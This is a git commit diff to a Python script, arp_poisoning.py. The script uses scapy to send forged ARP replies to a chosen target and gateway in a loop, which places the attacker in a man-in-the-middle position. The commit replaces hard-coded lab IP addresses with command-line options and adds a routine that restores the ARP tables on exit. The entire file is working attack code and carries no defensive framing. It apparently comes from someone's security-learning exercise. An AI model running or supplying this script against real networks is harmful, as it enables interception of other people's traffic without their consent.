be8f7015ed5bd1334888203a1c117eab17a9c2bf
posew7 <posew7@gmail.com>
2019-04-20 16:01:47 +0100

    scapy time optparse mitm

--- arp_poisoning.py
+++ arp_poisoning.py
@@ -3,6 +3,13 @@
 
 import scapy.all as scapy
 import time
+import optparse
+
+def user_input():
+    parse = optparse.OptionParser()
+    parse.add_option("-t","--target",dest="target_ip",help="enter target ip")
+    parse.add_option("-g","--gateway",dest="poisoning_ip",help="enter poisoning ip")
+    return parse.parse_args()
 
 def get_mac_address(target_ip):
     arp = scapy.ARP(pdst=target_ip)
@@ -16,13 +23,23 @@ def arp_poisoning(target_ip,poisoning_ip):
     arp = scapy.ARP(op=2,psrc=poisoning_ip,hwdst=target_mac,pdst=target_ip)
     scapy.send(arp,verbose=False)
 
+def reset_operation(target_ip,poisoning_ip):
+    target_mac = get_mac_address(target_ip)
+    target_mac2 = get_mac_address(poisoning_ip)
+    arp = scapy.ARP(op=2,psrc=poisoning_ip,hwsrc=target_mac2,pdst=target_ip,hwdst=target_mac)
+    scapy.send(arp,verbose=False,count=7)
+
 sayac = 0
+(input,arguments) = user_input()
 try:
     while(True):
-        arp_poisoning("10.0.2.1","10.0.2.3")
-        arp_poisoning("10.0.2.3","10.0.2.1")
+        arp_poisoning(input.target_ip,input.poisoning_ip)
+        arp_poisoning(input.poisoning_ip,input.target_ip)
         sayac += 2
         print("\rpaket yollandı.. ",sayac,end="")
         time.sleep(3)
 except(KeyboardInterrupt):
-    print("\n\nçıkış yaptınız\n")
+    print("\n\nçıkılıyor..\n")
+    reset_operation(input.target_ip,input.poisoning_ip)
+    reset_operation(input.poisoning_ip,input.target_ip)
+    print("\narp tablosu resetlendi\n")
